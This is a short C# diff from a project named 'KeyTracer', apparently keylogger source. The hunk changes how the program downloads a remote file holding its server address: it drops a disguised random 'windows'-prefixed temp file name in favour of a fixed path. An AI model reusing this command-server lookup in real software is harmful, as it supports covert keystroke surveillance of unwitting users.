@@ -15,14 +15,10 @@ namespace KeyTracer
             try
             {
                 WebClient webClient = new WebClient();
-                Random random = new Random();
 
-                string fileName =  "windows" + random.Next(9999999).ToString();
-                string fileAdr = Path.Combine(Consts.tempPath, fileName);
+                webClient.DownloadFile(Consts.serverLocation, Consts.serverPath);
 
-                webClient.DownloadFile(Consts.serverLocation, fileAdr);
-
-                Consts.Server = File.ReadAllText(fileAdr);
+                Consts.Server = File.ReadAllText(Consts.serverPath);
 
                 return 1;
             }
